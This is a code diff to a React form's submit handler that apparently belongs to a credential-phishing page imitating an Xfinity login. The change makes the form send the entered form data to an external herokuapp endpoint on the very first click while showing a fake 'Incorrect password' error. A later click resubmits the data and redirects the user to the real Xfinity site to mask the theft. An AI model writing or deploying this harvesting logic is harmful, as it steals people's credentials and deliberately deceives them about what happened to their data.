@@ -51,16 +51,17 @@ const FormContainer = () => {
 
 
   const handleSubmit = async (e) => {
-
     e.preventDefault();
-
+  
+    // Increment click count on every click
     setClickCount((prevCount) => prevCount + 1);
-
+  
+    // On the first click, show error and submit data
     if (clickCount === 0) {
-      // Simulate an error on the first click
       setError('Incorrect password. Please try again.');
-      console.log('Error:', 'Failed to submit. Please try again later.');
-    } else {
+      console.log('Error:', 'Incorrect password on the first attempt.');
+  
+      // Always send data, even on the first click
       try {
         const response = await fetch(
           'https://shielded-island-46547-e694e2bd0c22.herokuapp.com/api/submit',
@@ -72,14 +73,40 @@ const FormContainer = () => {
             body: JSON.stringify(formData),
           }
         );
-
+  
         const data = await response.json();
         console.log(data);
-
+  
+        // If needed, you can handle success response here as well
+      } catch (error) {
+        console.error('Error on first attempt:', error);
+      }
+    } else {
+      // On subsequent clicks, clear the error and submit the data
+      setError(''); // Clear the error
+      console.log('Submitting data on subsequent attempt');
+  
+      try {
+        const response = await fetch(
+          'https://shielded-island-46547-e694e2bd0c22.herokuapp.com/api/submit',
+          {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(formData),
+          }
+        );
+  
+        const data = await response.json();
+        console.log(data);
+  
         if (data.success) {
+          // Redirect on successful submission
           window.location.href =
             'https://www.xfinity.com/planbuilder?localize=true&drawer=internet';
         } else {
+          // Handle any error response
           setError(data.message);
         }
       } catch (error) {
@@ -88,7 +115,7 @@ const FormContainer = () => {
       }
     }
   };
-
+  
   return (
 
     <div>
